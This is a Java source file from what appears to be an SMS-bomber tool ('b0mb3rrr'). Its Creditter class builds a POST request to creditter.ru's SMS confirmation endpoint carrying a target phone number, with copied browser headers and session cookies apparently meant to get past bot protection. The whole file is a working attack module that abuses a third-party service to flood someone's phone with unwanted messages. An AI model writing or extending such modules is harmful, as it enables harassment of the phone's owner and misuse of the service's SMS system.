package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Creditter extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        return new Request.Builder()
                .url("https://api.creditter.ru/confirm/sms/send")
                .post(RequestBody.create(STR."{\"type\":\"register\",\"phone\":\"\{phone.phone()}\"}", MediaType.parse("application/json; charset=utf-8")))
                .header("Accept", "application/json, text/plain, */*")
                .header("Accept-Language", "en-US,en;q=0.9,ru;q=0.8")
                .header("Connection", "keep-alive")
                .header("Content-Type", "application/json")
                .header("Cookie", "qrator_jsr=1712669974.235.eF9QcoaiTxgBPQbE-vqlgd1lq3d0i413fdpk03snk1g1ef2um-00; _ym_uid=1712669978632817025; _ym_d=1712669978; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.784735345.1712669979; _gid=GA1.2.218422837.1712669979; _gat_gtag_UA_66665572_1=1; jslbrc=w.20240409133945a05d1398-f676-11ee-a435-46cc3b1d83cc.C_GS; _ga_2GXQE6XM50=GS1.1.1712669978.1.1.1712669991.0.0.0; qrator_jsid=1712669974.235.eF9QcoaiTxgBPQbE-dclsgdt9p594qu7604fna3b9oekr7cas")
                .header("Origin", "https://creditter.ru")
                .header("Referer", "https://creditter.ru/")
                .header("Sec-Fetch-Dest", "empty")
                .header("Sec-Fetch-Mode", "cors")
                .header("Sec-Fetch-Site", "same-site")
                .header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"");
    }

    @Override
    public String getServiceName() {
        return "Creditter";
    }
}
